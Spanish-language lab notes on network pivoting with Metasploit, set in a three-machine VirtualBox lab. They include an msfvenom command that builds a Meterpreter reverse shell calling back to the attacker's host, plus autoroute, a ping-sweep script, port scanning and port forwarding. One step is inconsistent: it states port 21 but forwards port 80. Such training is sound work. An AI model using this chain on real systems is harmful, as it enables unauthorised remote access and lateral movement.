## CONFIGURACIÓN LABORATORIO
Lo primero será ir a la parte de herramientas y Administrador de red: 
![[Pasted image 20230717133814.png]]
Y ahora vamos a la parte de redes NAT y creamos nuestra primera red con estos parámetros:
![[Pasted image 20230717134004.png]]
Por tanto, una vez creada esta red sobre la que haremos pivoting, veremos como configuraremos las 3 máquinas:
MÁQUINA KALI:
![[Pasted image 20230717134609.png]]
MÁQUINA LINUX INTERMEDIA:
![[Pasted image 20230717134629.png]]
MÁQUINA METASPLOITABLE FINAL:
![[Pasted image 20230717134647.png]]
De tal forma que la máquina kali tiene conectividad solo con la máquina Linux Mint; y la máquina Linux mint tiene conectividad tanto con la Kali como con la metasploitable:
![[Pasted image 20231112112447.png]]
# PIVOTING
Lo primero será ponernos a la escucha con el multi/handler, utilizando el siguiente payload:
```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```
Y ahora con msfvenom generamos el payload:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
```
![[Pasted image 20230717125603.png]]
Lo ejecutamos dentro de la máquina objetivo:
![[Pasted image 20231112112729.png]]
Y en metasploit habremos recibido una sesión de meterpreter:
![[Pasted image 20230717125857.png]]
En este punto ya podemos listar las interfaces de red para poder establecer el tráfico o la tunelización con el comando ipconfig:
![[Pasted image 20231112114143.png]]
Ahora para tunelizar todo el tráfico de la máquina ubuntu a la máquina atacante, tenemos que poner la sesión de meterpreter en segundo plano, de tal forma que podamos listarla usando el comando sessions -l:
![[Pasted image 20230717162209.png]]
Ahora utilizamos el módulo de autoroute para enturar el tráfico:
```bash
use post/multi/manage/autoroute
```
![[Pasted image 20231112112908.png]]
Ahora vamos a detectar equipos conectados dentro de la red interna, por lo que usaremos el siguiente script de bash:
```bash
#!/bin/bash

for i in {1..255}; do
    timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
    if [ $? -eq 0 ]; then
        echo "El host 10.10.10.$i está activo"
    fi
done
```
Compartiéndolo desde nuestra máquina atacante:
![[Pasted image 20231112120252.png]]
Con la máquina víctima:
![[Pasted image 20231112120307.png]]
Lo ejecutamos y detectamos equipos:
![[Pasted image 20231112120513.png]]
Por ejemplo, vamos a escanear la IP 10.10.10.5, por lo que usamos el siguiente módulo para escanear sus puertos:
```bash
use scanner/portscan/tcp
```
Le pasamos la IP de la máquina objetivo (por ejemplo la 10.10.10.5) y vemos que nos devuelve los puertos abiertos:
![[Pasted image 20231112120941.png]]
Vamos a suponer que queremos llegar al puerto 21, por lo que tendríamos que hacer un port forwarding:
```bash
portfwd add -l 5000 -p 80 -r 10.10.10.5
```

